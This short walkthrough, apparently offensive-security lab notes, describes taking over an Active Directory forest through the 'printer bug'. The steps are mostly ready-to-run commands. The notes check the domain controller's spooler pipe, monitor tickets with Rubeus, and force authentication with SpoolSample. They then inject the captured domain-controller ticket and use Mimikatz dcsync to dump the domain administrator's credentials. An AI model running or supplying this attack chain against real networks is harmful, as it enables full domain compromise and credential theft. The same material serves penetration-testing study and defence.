## Owning the Forest - Printers Bug

1. First we need to check if we got access to the print spoolser service

```PowerShell
PS C:\> ls \\rdc01\pipe\spoolss
```

If we got our access, this means we can use the RpcRemoteFindFirstPrinterChangeNotification API to force an authentication and allow us to obtain a forwardable TGT.

2. Open administrative cmd, and then use Rubeus to monitor tickets

```PowerShell
C:\Tools> Rubeus.exe monitor /interval:5 /filteruser:RDC01$
```

3. Switch to a powershell prompt while rubeus is running, and launch spoolsample to force the print change notification.

```PowerShell
PS C:\Tools> .\SpoolSample.exe rdc01.sinhack.com devsrv01.secret.sinhack.com
```

4. Once we get the success message, we switch back to Rubeus and after few seconds we should see a new TGT displayed.

5. Now we can use Rubeus to inject our TGT into memory

```PowerShell
C:\Tools> Rubeus.exe ptt /ticket:doIE9DCCBPCgAwIBBaEDAgEWooIEBDCCBABhggP8MIID+...
```

6. A domain controller computer account has the access right to perform AD replication. We can exploit this by forcing a replication with Mimikatz dcsync

```bash
mimikatz # lsadump::dcsync /domain:sinhack.com /user:sinhack\administrator
```